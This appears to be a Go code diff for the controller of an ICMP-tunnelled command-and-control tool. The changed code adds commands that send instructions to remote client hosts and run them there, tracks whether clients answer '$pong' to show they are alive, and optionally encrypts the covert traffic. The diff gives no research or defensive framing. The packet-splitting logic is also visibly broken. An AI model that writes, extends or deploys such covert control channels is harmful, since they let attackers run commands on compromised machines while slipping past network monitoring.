@@ -30,6 +30,7 @@ var DEBUG bool = true
 
 var id int = 0
 var clients = make(map[int]string)
+var ALIVE = make(map[string]bool)
 var SSM bool = true
 var execute = false
 var PACKETQUEUE []icmp.Message
@@ -138,7 +139,7 @@ func generate_packet(payload string, segment int) {
 	// Recursivly calls generate packet if too large
 	if byteSize > 1460 {
 		fmt.Println("Conductor we have a problem!!!!!")
-		payload := payload[0:1460]
+		payload = payload[0:1460]
 		nextPayload := payload[1460:byteSize]
 		if SSM {
 			payload = encrypt_decrypt(payload)
@@ -183,7 +184,32 @@ func send_packets(addr string, c icmp.PacketConn) {
 			fmt.Println("YOU FELL OFF")
 		}
 	}
+}
 
+func sendmessage(command string, clientid int, c icmp.PacketConn) {
+	command = strings.TrimRight(command, "\r\n")
+	execute = false
+	ipaddr := strings.TrimRight(clients[clientid], "\r\n")
+	generate_packet(command, 0)
+	if DEBUG {
+		fmt.Print("[DEBUG] ", command, " sent to ", clients[clientid])
+	}
+	send_packets(ipaddr, c)
+}
+
+// func sendtoall() {
+// 	for k := range clients {
+// 		generate_packet()
+// 		send_packets()
+// 	}
+// }
+
+func checkalive(src string, payload string) {
+	if payload == "$pong" {
+		ALIVE[src] = true
+	} else {
+		ALIVE[src] = false
+	}
 }
 
 func deviceExists(name string) bool {
@@ -199,19 +225,6 @@ func deviceExists(name string) bool {
 	return false
 }
 
-func set_flags(header string) {
-	if header[3] == '1' {
-		SSM = true
-	} else {
-		SSM = false
-	}
-	if header[4] == '1' {
-		execute = true
-	} else {
-		execute = false
-	}
-}
-
 func sniffer() {
 	handler, err := pcap.OpenLive("ens160", buffer, false, pcap.BlockForever)
 	if err != nil {
@@ -225,7 +238,6 @@ func sniffer() {
 	for packet := range source.Packets() {
 		payload := convert(packet.ApplicationLayer().Payload())
 		header := payload[0:7]
-		set_flags(header)
 		if strings.HasPrefix(header, "###") {
 			payload = payload[7:]
 
@@ -233,10 +245,11 @@ func sniffer() {
 			ip, _ := ipLayer.(*layers.IPv4)
 
 			if SSM {
-				fmt.Print((encrypt_decrypt(payload)), " received from ", ip.DstIP)
-			} else {
-				fmt.Print((payload), " received from ", ip.DstIP)
+				payload = encrypt_decrypt(payload)
 			}
+			fmt.Print((payload), " received from ", ip.DstIP)
+			checkalive(string(ip.DstIP), payload)
+
 		} else {
 			continue
 		}
@@ -347,6 +360,20 @@ func main() {
 		} else if strings.HasPrefix(input, "ls") {
 			showclients()
 
+		} else if strings.HasPrefix(input, "send") {
+			_, after, _ := strings.Cut(input, " ")
+			id, command, _ := strings.Cut(after, " ")
+			clientid := parse_id(id)
+			if _, ok := clients[clientid]; ok {
+				sendmessage(command, clientid, *c)
+			} else {
+				fmt.Println("Invalid Client")
+				continue
+			}
+
+		} else if strings.HasPrefix(input, "sendtoall") {
+			// sendtoall()
+
 		} else if strings.HasPrefix(input, "exe") {
 
 			_, after, _ := strings.Cut(input, " ")
@@ -358,14 +385,13 @@ func main() {
 				ipaddr := strings.TrimRight(clients[clientid], "\r\n")
 				generate_packet(command, 0)
 				if DEBUG {
-					fmt.Print("[DEBUG] ", command, " sent to ", clients[clientid])
+					fmt.Print("[DEBUG] ", command, " executed on ", clients[clientid])
 				}
 				send_packets(ipaddr, *c)
 			} else {
 				fmt.Println("Invalid Client")
 				continue
 			}
-
 		} else if strings.HasPrefix(input, "help") {
 			print_help()
 
